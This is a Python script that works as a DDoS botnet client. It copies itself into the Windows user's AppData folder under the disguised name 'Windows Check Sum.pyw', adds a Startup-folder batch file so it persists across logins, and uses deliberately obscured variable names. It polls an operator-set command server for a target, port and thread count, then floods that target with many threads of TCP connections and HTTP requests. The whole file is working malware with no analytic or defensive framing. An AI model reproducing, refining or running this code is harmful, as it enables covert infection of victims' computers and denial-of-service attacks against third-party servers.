import threading
import socket
import time
import shutil
import getpass
import sys
import os


global count

count = 0


def main():


    global count
    count = count + 1

    global target
    global port_
    global threads
    global Continue
    global connected


    if count <= 1:
        Continue = False
        Lll = getpass.getuser()
        LLL1 =  "/Users/" + Lll + "/AppData/Local/Microsoft/WindowsApps"
        lll = sys.argv[0]
        lll1 = lll.split("\\")
        lll = lll.replace("\\\\", "/")
        name1 = lll1[(len(lll1) - 1)]


        try:
            shutil.copy(lll, LLL1)
            name = LLL1+"/"+str(name1)
            os.rename(name, LLL1+"/"+"Windows Check Sum.pyw")
        except:
            asdasd = False


        llllll1111l = '/Users/' + Lll + '/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup'
        with open(llllll1111l + "/" + "Windows check sum.bat", "w+") as f:
            f.write('start '+ "C:\\Users\\" + Lll + "\\AppData\\Local\\Microsoft\\WindowsApps\\Windows Check Sum.pyw")

    def con():
        global connected
        global Continue

        ililil111 = '' #put your server ip here
        lllLLLLLLL = 6969 #put your port here
        if Continue == False:
            connected = False
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            while connected == False:
                try:
                    s.connect((ililil111, lllLLLLLLL))
                    connected = True
                    Continue = True
                    data = s.recv(1024)
                    data = data.decode("utf8")
                    Based = {"data":data, "connected":connected}
                    s.close()
                    return Based
                except:
                    print("error")
                    Continue = False
                    connected = False
                    time.sleep(1)
    def attack():
        global target
        global port_
        global threads
        global Continue
        global connected
        while Continue == True:
            if connected == False:
                Continue = False
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((target, port_))
                s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target, port_))
                s.close()
            except:
                Continue = False
                connected = False


    data2 = con()

    if count <= 1:
        asd = data2["data"]
        asd = asd.split(":")
        target = asd[0]
        port_ = int(asd[1])
        threads = asd[2]

        print(target + " " + str(port_) + " " + threads)
    if connected == True:
        for i in range(int(threads)):
            thread = threading.Thread(target=attack)
            thread.start()

    if connected == False:
        main()
main()